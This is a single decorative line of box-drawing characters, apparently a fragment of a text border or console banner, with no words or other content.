+════════════════════════════════════════════════════════
